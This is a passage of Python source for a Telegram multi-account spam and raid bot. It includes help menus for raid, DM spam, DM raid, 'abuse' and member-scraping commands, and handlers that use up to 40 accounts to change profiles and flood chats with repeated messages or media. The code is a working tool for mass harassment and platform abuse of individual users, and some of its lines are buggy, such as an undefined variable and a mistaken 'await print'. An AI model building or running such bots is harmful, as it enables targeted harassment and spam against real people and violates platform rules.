Command:
i) {hl}delayraid <delay> <count> <Username of User>
ii) {hl}delayraid <delay> <count> <reply to a User>

**replyraid:** Activates reply raid on individual user
commands:
i) {hl}replyraid <replying to anyone>
ii) {hl}replyraid <username>

**dreplyraid:** De-activates reply raid from user!!
commands:
i) {hl}dreplyraid <replying to anyone>
ii) {hl}dreplyraid <username>


**© @RiZoeLX**
"""


dm_help = f"""
**• Dm Cmds •**

**Dm:** Dm to any individual using spam bots
command:
i) {hl}dm <username> <message>
ii) {hl}dm <message> <reply to the user>

**Dm Spam:** Spam in Dm of Any individual Users
command:
i) {hl}dmspam <count> <username> <message to spam>
ii) {hl}dmspam <count> <username> <reply to a message>

**Dm Raid:** raid in Dm of Any individual Users
command:
i) {hl}dmraid <count> <username>
ii) {hl}dmraid <count> <reply to the user>

**© @RiZoeLX**
"""

echo_help = f"""
**• Echo cmds •**

**addecho:** Active Echo On user
Command:
{hl}addecho <reply to user>

**rmecho:** De-activate Echo From user
Command:
{hl}rmecho <reply to user>

**© @RiZoeLX**
"""

join_help = f"""
**• Join Cmds •**

**join:** Join any Public Channel and group
command:
{hl}join <channel/group invite link or username>

**pjoin:** Join Any Private Channel Or group
command:
{hl}pjoin <channel/group Hash>

Example: group Link : https://t.me/+Abcdefghijkl
cmd : {hl}pjoin Abcdefghijkl

__Only Owner And Full Sudo Users can !!__

**© @RiZoeLX
"""

leave_help = f"""
**• Leave Cmds •**

**leave:** Leave any Public/private Group or Channel
commands:
i) {hl}leave <group or channel chat id>
ii) {hl}leave

__Only Owner And Full Sudo Users can !!__

**© @RiZoeLX**
"""

userbot_help = f"""
**• Userbot Cmds •**

**Commands:**

- {hl}ping : To check Ping 

- {hl}alive : To check Bot Version and Other info

- {hl}restart : To Restart Your Spam Bots

**© @RiZoeLX**
"""

extra_help = f"""
**• Extra Cmds •**

**abuse:** Abuse Any Individual user continuously
command:
{hl}abuse <username>

__we'll Add More Cmds Soon__

**© @RiZoeLX**
"""

owner_help = f"""
**• Owner And Full Sudo Cmds •**
__Note__ : Only Spam Bot's Owner and Full Sudo Can Use this cmds.

**Scraping:** members adding In Group
command:
{hl}scrape <Public Group invite Link or username>

**Profile:** Profile And Other Cmds
commands:

1) {hl}setname <Profile Name>
2) {hl}setbio <coustom Bio>
3) {hl}setpic <reply to media>
4) {hl}stats

**Add Sudo:** Add Sudo Using Spam bots
commands:
1) {hl}addsudo <reply to user>
2) {hl}fullsudo <reply to user>
"""

help_menu = f"""
**RiZoeL X Spam Help**

**There are following categories**

`owner` : Get all owner and Full Sudo commands and its usage
`spam` : Get all spam commands and its usage
`raid` : Get all raid commands and its usage
`dm` : Get all dm commands and its usage
`echo` : Get echo commands and its usage
`join` : Get join commands and its usage
`leave` : Get leave commands and its usage
`userbot` : Get all userbot commands
`extra` : Get all extra commands and its usage

**Type** {hl}help <category> **to get all commands in that category and its usage**
**Example**: `{hl}help spam`

**© @RiZoeLX**
"""

# Profile Cmds

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%ssetname(?: |$)(.*)" % hl))
async def name(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗖𝗛𝗔𝗡𝗚𝗘 𝗡𝗔𝗠𝗘\n\nCommand:\n\n{hl}setname <Message to change name of spam ids>"
    if e.sender_id == OWNER_ID or e.sender_id in DEV:
        names = e.text.split(" ", 1)
        RiZoeL = names[1]
        if len(e.text) > 5:
            firstname = RiZoeL
            text = "Changing Name..."
            try:
                await e.client(functions.account.UpdateProfileRequest(first_name=firstname))
                event = await e.reply(text, parse_mode=None, link_preview=None )
                await event.edit("Changed name successfully! ✅")
            except Exception as e:
                await print(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

#bio 
            
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%ssetbio(?: |$)(.*)" % hl))
async def _(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗖𝗛𝗔𝗡𝗚𝗘 𝗕𝗜𝗢\n\nCommand:\n\n{hl}setbio <Message to change name of spam ids>"
    if e.sender_id == OWNER_ID or e.sender_id in DEV:
        fukyou = e.text.split(" ", 1)
        message = fukyou[1]
        if len(e.text) > 5:
            bio = message
            text = "Changing Bio..."
            try:
                await e.client(functions.account.UpdateProfileRequest(about=bio))
                event = await e.reply(text, parse_mode=None, link_preview=None )
                await asyncio.sleep(0.7)
                await event.edit("Changed bio successfully! ✅")
            except Exception as e:
                await print(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )         
        

# statss                   
            
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sstats(?: |$)(.*)" % hl))
async def stats(event):
   u = 0
   g = 0
   c = 0
   bc = 0
   b = 0
   rizoel = ""
   if event.sender_id == OWNER_ID or e.sender_id in DEV:
        event = await event.reply("__Processing__.....")
       # await event.edit("`Processing..`")
        dialogs = await event.client.get_dialogs(limit=None, ignore_migrated=True)
        for d in dialogs:
            currrent_entity = d.entity
            if isinstance(currrent_entity, User):
                if currrent_entity.bot:
                    b += 1
                else:
                    u += 1
            elif isinstance(currrent_entity, Chat):
                g += 1
            elif isinstance(currrent_entity, Channel):
                if currrent_entity.broadcast:
                    bc += 1
                else:
                    c += 1
            else:
                print(d)
         
        rizoel += f"🔻 **HERE IS YOUR RIZOELXSPAM STATS** 🔻\n\n"
        rizoel += f"`Users:`\t**{u}**\n"
        rizoel += f"`Groups:`\t**{g}**\n"
        rizoel += f"`Super Groups:`\t**{c}**\n"
        rizoel += f"`Channels:`\t**{bc}**\n"
        rizoel += f"`Bots:`\t**{b}**"
        await event.edit(rizoel)
        
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%ssetpic(?: |$)(.*)" % hl))
async def propic(event):
   if event.sender_id in DEV:
     try:
        Rizoel = await event.get_reply_message()
        try:
            media = await Rizoel.download_media("resources/downloads/")
        except:
            pass
        await event.client(UploadProfilePhotoRequest(await event.client.upload_file(media)))
        await event.reply(f"**Changed profile picture successfully** ✅")
        try:
            os.remove(media)
        except Exception as e:
            print(str(e))
     except Exception as e:
         print(e)

# Spam Plugins

async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception:
        pass

@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sspam(?: |$)(.*)" % hl))
async def spam(e):
    usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n{hl}spam <count> <message to spam>\n\n{hl}spam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SUDO_USERS or e.sender_id in DEV:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        Rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(Rizoel) == 2:
            message = str(Rizoel[1])
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            if int(e.chat_id) in GROUP:
                return await e.reply("Sorry !! I can't spam here")
            counter = int(Rizoel[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None)
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:
            counter = int(Rizoel[0])
            if int(e.chat_id) in GROUP:
                 return await e.reply("Sorry !! I can't spam here")
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None)
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            if re.search(TheRiZoeL.lower(), message.lower()):
                return await e.reply("**Sorry !!** I can't Spam On @RiZoeLX's owner")
            counter = int(Rizoel[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None)
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)
            
@Riz.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz11.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz12.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz13.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz14.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz15.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz16.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz17.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sbigspam(?: |$)(.*)" % hl))
